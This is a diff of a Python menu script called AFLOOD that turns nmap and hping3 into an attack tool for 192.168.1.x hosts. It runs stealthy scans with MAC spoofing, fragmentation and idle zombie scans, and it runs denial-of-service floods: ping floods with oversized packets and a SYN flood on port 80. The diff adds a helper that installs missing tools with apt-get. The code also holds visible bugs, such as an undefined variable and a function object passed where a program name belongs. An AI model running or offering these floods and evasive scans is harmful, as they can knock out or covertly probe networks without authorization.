@@ -3,95 +3,131 @@
 
 from __future__ import print_function
 import os
+import subprocess
 
-m = 0
-n = 0
-t = 0
+select = 0
+ip_num = 0
+time = 0
 
-print ("Welcome to AFLOOD v1.5.7")
-print ("($ = Fragment packets)")
-print ("($$ = $+Spoof MAC address)")
+print ("Welcome to AFLOOD v1.6")
 print ("[1]: Nmap scan $")
-print ("[2]: OS finding (Nmap) $")
-print ("[3]: Port scan (Nmap) $$")
-print ("[4]: Firewall detection (Nmap) $")
-print ("[5]: Firewall scan (Nmap) $")
-print ("[6]: Zombie scan (Nmap)")
-print ("[8]: Ping flooding")
-print ("[9]: Ping flooding (with timeout)")
+print ("[2]: Other Nmap options")
+print ("[9]: DOS attack")
 print ("[0]: Exit")
 
-def nmap(m):
+
+#for some strange reasons this function dont work
+def installed(application):
+    print("ci provo")
+    try:
+        print("ci provo1")
+        devnull = open(os.devnull, "w")
+        print("ci provo2")
+        subprocess.Popen([application], stdout=devnull, stderr=devnull).communicate()
+        print("ci provo3")
+    except AttributeError:
+        print("ci provo4")
+        return
+    except OSError as e:
+        if e.errno == os.errno.ENOENT:
+            print("You have not installed", application)
+            select = raw_input("Do you want to install it? [y/n]: ")
+            if select == "y" :
+                cmdstring = "apt-get install %s -y" % (application)
+                os.system(cmdstring)
+                return
+            else:
+                print("You cannot use this function!")
+                return
+        else:
+            print("Some strange error..")
+            return
+    raise
+
+def nmap(select):
+    #installed(nmap)
+    print ("[1]: OS finding (Nmap) $")
+    print ("[2]: Port scan (Nmap) $$")
+    print ("[3]: Firewall detection (Nmap) $")
+    print ("[4]: Firewall scan (Nmap) $")
+    print ("[5]: Zombie scan (Nmap)")
+    select = int(input("Insert a number: "))
     list=["OS finding","Port scanning","Firewall Detection","Firewall scan (N)","Zombie scan (?)"]
-    print (list[m-2])
-    print("Write the IP of the target (last digit)")
-    n = int(input("(0-255): "))
-    if n < 255 and n > 0 :
-        if m == 2:
-            print("OS 192.168.1.", n, sep="")
-            cmdstring = "nmap -A -f 192.168.1.%s" % (n)
+    print (list[select-1])
+    ip_num = int(input("Write the IP of the target (last digit) (0-255): "))
+    if ip_num < 255 and ip_num > 0 :
+        if select == 1:
+            print("OS 192.168.1.", ip_num, sep="")
+            cmdstring = "nmap -A -f 192.168.1.%s" % (ip_num)
             #--spoof-mac 0 -e -Pn 
-        elif m == 3:
-            print("Port scanning 192.168.1.", n, sep="")
-            cmdstring = "nmap --spoof-mac 0 -v -sT --open -Pn -PN -sV 192.168.1.%s" % (n)
-        elif m == 4:
-            print("Firewall detection at 192.168.1.", n, sep="")
-            cmdstring = "nmap -sA -f -Pn -sV 192.168.1.%s" % (n)
-        elif m == 5:
+        elif select == 2:
+            print("Port scanning 192.168.1.", ip_num, sep="")
+            cmdstring = "nmap --spoof-mac 0 -v -sT --open -Pn -PN -sV 192.168.1.%s" % (ip_num)
+        elif select == 3:
+            print("Firewall detection at 192.168.1.", ip_num, sep="")
+            cmdstring = "nmap -sA -f -Pn -sV 192.168.1.%s" % (ip_num)
+        elif select == 4:
             print("Select firewall scan type:")
             print ("[1]: TCP Null scan")
             print ("[2]: TCP Fin scan")
             print ("[3]: TCP Xmas scan")
             list=["Null","Fin","Xmas"]
-            m = int(input("(1-3): "))
-            print("TCP ",list[m-1]," scan at 192.168.1.", n, sep="")
-            if m == 1:
-                cmdstring = "nmap -sN -f 192.168.1.%s" % (n)
-            elif m == 2:
-                cmdstring = "nmap -sF -f 192.168.1.%s" % (n)
-            elif m == 3:
-                cmdstring = "nmap -sX -f 192.168.1.%s" % (n)
-        elif m == 6:
+            select = int(input("(1-3): "))
+            print("TCP ",list[m-1]," scan at 192.168.1.", ip_num, sep="")
+            if select == 1:
+                cmdstring = "nmap -sN -f 192.168.1.%s" % (ip_num)
+            elif select == 2:
+                cmdstring = "nmap -sF -f 192.168.1.%s" % (ip_num)
+            elif select == 3:
+                cmdstring = "nmap -sX -f 192.168.1.%s" % (ip_num)
+        elif select == 5:
             print("Write the IP of the zombie (last digit)")
-            m = int(input("(0-255): "))
-            print("Zombie scan at 192.168.1.", n, sep="")
-            cmdstring = "nmap -sI 192.168.1.%s 192.168.1.%s" % (m, n)
-            
+            select = int(input("(0-255): "))
+            print("Zombie scan at 192.168.1.", ip_num, sep="")
+            cmdstring = "nmap -sI 192.168.1.%s 192.168.1.%s" % (select, ip_num)
         os.system(cmdstring)
     else:
         print("Wrong number!")
 
-def ping(m):
-    list = ["Ping flooding","Ping flooding (with timeout)"]
-    print (list[m-8])
-    print("Write the IP (last digit)")
-    n = int(input("(0-255): "))
-    if n < 255 and n > 0 :
-        print("Ping flooding at IP 192.168.1.", n, sep="")
-        if m == 8:
-            cmdstring = "ping  -f -i 0.001 -s 65000 192.168.1.%s" % (n)
-        else:
-            print("Write the timeout (in second)")
-            t = int(input("(Second): "))
-            cmdstring = "ping -f -i 0.001 -w %s -s 65000 192.168.1.%s" % (t, n)
+def dos(select):
+    print ("[1]: Ping flooding")
+    print ("[2]: Ping flooding (with timeout)")
+    print ("[3]: SYN flooding")
+    select = int(input("Insert a number: "))
+    list = ["Ping flooding","Ping flooding (with timeout)","Syn flooding"]
+    print (list[select-1])
+    ip_num = int(input("Write the IP (last digit) (0-255): "))
+    if ip_num < 255 and ip_num > 0 :
+        if select == 1:
+            print("Ping flooding at IP 192.168.1.", ip_num, sep="")
+            cmdstring = "ping  -f -i 0.001 -s 65000 192.168.1.%s" % (ip_num)
+        elif select == 2:
+            print("Ping flooding at IP 192.168.1.", ip_num, sep="")
+            time = int(input("Write the timeout (Second): "))
+            cmdstring = "ping -f -i 0.001 -w %s -s 65000 192.168.1.%s" % (time, ip_num)
+        elif select == 3:
+            #installed("hping3")
+            print("SYN flooding at IP 192.168.1.", ip_num, sep="")
+            cmdstring = "hping3 -f --flood -S -p 80 192.168.1.%s" % (ip_num)
         os.system(cmdstring)
     else:
         print("Wrong number!")
     
-while 1 == 1:
-    m = int(input("Insert a number: "))
+while True:
+    select = int(input("Insert a number: "))
 
-    if m == 1:
+    if select == 1:
+        installed(nmap)
         print ("Nmap scan")
         os.system("nmap -f -sn 192.168.1.1/24")
 
-    elif m > 1 and m < 7 :
-        nmap(m)
+    elif select == 2:
+        nmap(select)
 
-    elif m == 8 or m == 9:
-        ping(m)
+    elif select == 9:
+        dos(select)
 
-    elif m == 0:
+    elif select == 0:
         print ("Exit")
         exit()
 
